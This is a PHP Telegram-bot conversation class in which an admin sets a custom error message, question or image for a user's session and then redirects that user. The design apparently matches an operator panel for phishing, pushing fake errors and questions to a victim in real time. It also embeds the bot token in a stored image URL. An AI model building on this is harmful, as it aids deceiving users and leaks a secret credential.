<?php

declare(strict_types=1);

namespace App\Telegram\Conversations;

use App\Actions\Session\SelectActionAction;
use App\Enums\ActionType;
use App\Models\Session;
use App\Services\SessionService;
use App\Services\TelegramService;
use SergiX44\Nutgram\Conversations\Conversation;
use SergiX44\Nutgram\Nutgram;
use SergiX44\Nutgram\Telegram\Types\Keyboard\InlineKeyboardButton;
use SergiX44\Nutgram\Telegram\Types\Keyboard\InlineKeyboardMarkup;

/**
 * Conversation для ввода кастомного текста (ошибка, вопрос, картинка)
 */
class CustomActionConversation extends Conversation
{
    protected ?string $sessionId = null;
    protected ?string $actionType = null;

    public function __construct(
        private readonly SessionService $sessionService,
        private readonly TelegramService $telegramService,
        private readonly SelectActionAction $selectActionAction,
    ) {}

    /**
     * Инициализация conversation
     */
    public function start(Nutgram $bot, string $sessionId, string $actionType): void
    {
        $this->sessionId = $sessionId;
        $this->actionType = $actionType;

        $action = ActionType::tryFrom($actionType);
        if (!$action) {
            $bot->sendMessage('❌ Неизвестный тип действия');
            $this->end();
            return;
        }

        $prompt = match ($action) {
            ActionType::CUSTOM_ERROR => '❌ <b>Кастомная ошибка</b>

Введите текст ошибки, который увидит пользователь:',
            ActionType::CUSTOM_QUESTION => '❓ <b>Кастомный вопрос</b>

Введите вопрос, на который должен ответить пользователь:',
            ActionType::CUSTOM_IMAGE => '🖼 <b>Кастомная картинка</b>

Отправьте URL картинки или загрузите изображение:',
            default => 'Введите текст:',
        };

        $keyboard = InlineKeyboardMarkup::make()
            ->addRow(
                InlineKeyboardButton::make('❌ Отмена', callback_data: 'cancel_conversation')
            );

        $bot->sendMessage(
            text: $prompt,
            parse_mode: 'HTML',
            reply_markup: $keyboard,
        );

        $this->next('handleInput');
    }

    /**
     * Обработка ввода текста
     */
    public function handleInput(Nutgram $bot): void
    {
        // Проверка на отмену
        if ($bot->callbackQuery()?->data === 'cancel_conversation') {
            $bot->answerCallbackQuery(text: '❌ Отменено');
            $bot->deleteMessage(
                chat_id: $bot->chatId(),
                message_id: $bot->callbackQuery()->message->message_id
            );
            $this->end();
            return;
        }

        $session = $this->sessionService->find($this->sessionId);
        if (!$session) {
            $bot->sendMessage('❌ Сессия не найдена');
            $this->end();
            return;
        }

        $action = ActionType::tryFrom($this->actionType);
        $admin = $bot->get('admin');

        // Получаем текст или фото
        $inputText = $bot->message()?->text;
        $photo = $bot->message()?->photo;
        $imageUrl = null;

        if ($photo) {
            // Получаем URL самой большой версии фото
            $largestPhoto = end($photo);
            $file = $bot->getFile($largestPhoto->file_id);
            $imageUrl = "https://api.telegram.org/file/bot" . config('services.telegram.bot_token') . "/" . $file->file_path;
        }

        // Сохраняем данные в сессию
        $updateData = ['action_type' => $this->actionType];
        
        switch ($action) {
            case ActionType::CUSTOM_ERROR:
                if (!$inputText) {
                    $bot->sendMessage('❌ Пожалуйста, введите текст ошибки');
                    return;
                }
                $updateData['custom_error_text'] = $inputText;
                break;
                
            case ActionType::CUSTOM_QUESTION:
                if (!$inputText) {
                    $bot->sendMessage('❌ Пожалуйста, введите текст вопроса');
                    return;
                }
                $updateData['custom_question_text'] = $inputText;
                break;
                
            case ActionType::CUSTOM_IMAGE:
                if (!$imageUrl && !$inputText) {
                    $bot->sendMessage('❌ Пожалуйста, отправьте URL или изображение');
                    return;
                }
                $updateData['custom_image_url'] = $imageUrl ?: $inputText;
                break;
        }

        // Обновляем сессию
        $session->update($updateData);
        
        // Выполняем действие
        $this->selectActionAction->execute($session->fresh(), $action, $admin);

        // Обновляем сообщение сессии
        $this->telegramService->updateSessionMessage($session->fresh());

        $bot->sendMessage(
            text: "✅ {$action->emoji()} {$action->label()} установлено!

Пользователь будет перенаправлен на страницу.",
            parse_mode: 'HTML',
        );

        $this->end();
    }
}
